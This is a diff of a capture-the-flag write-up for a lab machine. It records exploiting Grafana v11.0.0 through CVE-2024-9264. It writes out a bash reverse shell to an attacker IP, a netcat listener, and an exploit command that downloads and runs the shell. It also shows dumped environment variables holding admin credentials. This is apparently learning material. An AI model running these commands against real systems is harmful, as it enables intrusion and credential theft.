@@ -113,12 +113,6 @@ grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 17
 :: Progress: [100000/100000] :: Job [1/1] :: 626 req/sec :: Duration: [0:02:17] :: Errors: 0 ::
 
 ```
-- Added grafana to etc/hosts
-- Provided creds work in Grafana portal
-- Page source is saying Grafana v11.0.0
--  https://github.com/nollium/CVE-2024-9264
--  Made a basic reverse shell file: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
--  Started listening on port 8000 with: `python3 -m http.server 8000`
 # SSH
 ```
 ┌──(root㉿kali)-[/usr/share/wordlists/seclists/Discovery/Web-Content]
@@ -132,6 +126,55 @@ admin@10.10.11.68's password:
 Permission denied, please try again.
 ```
 Provided creds don't seem to work against SSH
+
+# Working Steps
+- Added grafana to etc/hosts
+- Provided creds work in Grafana portal
+- Page source is saying Grafana v11.0.0
+- CVE: `https://github.com/nollium/CVE-2024-9264`
+- Made virtual environment:
+```
+# Create a virtual environment
+python3 -m venv venv
+
+# Activate the virtual environment
+source venv/bin/activate
+```
+- Installed `requirements.txt` with `pip install -r requirements.txt` in venv
+-  Made a basic reverse shell file:
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
+```
+- Started serving file on port 8000 with: `python3 -m http.server 8000`
+- Started listening for reverse shell with: `nc -lvnp 4444`
+- Used exploit with `python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.14.5:8000/basic_bash_reverse_shell_p4444.sh -O /tmp/basic_bash_reverse_shell_p4444.sh && chmod +x /tmp/basic_bash_reverse_shell_p4444.sh && /tmp/basic_bash_reverse_shell_p4444.sh" http://grafana.planning.htb`
+- Reverse shell allowed me to find creds in /var/lib/grafana/ by running `env` in that path:
+```
+root@7ce659d667d7:/var/lib/grafana# env
+env
+AWS_AUTH_SESSION_DURATION=15m
+HOSTNAME=7ce659d667d7
+PWD=/var/lib/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_HOME=/usr/share/grafana
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+HOME=/usr/share/grafana
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=2
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_LOGS=/var/log/grafana
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+OLDPWD=/var/lib
+_=/usr/bin/env
+root@7ce659d667d7:/var/lib/grafana# 
+```
 
 # Lessons
 - Assume the worst - double check results with different tools and different wordlists. And use the biggest one available to you but also a different one altogether. This box required the bitquark txt one to find the `grafana` subdomain when none other had that keyword needed for this challenge
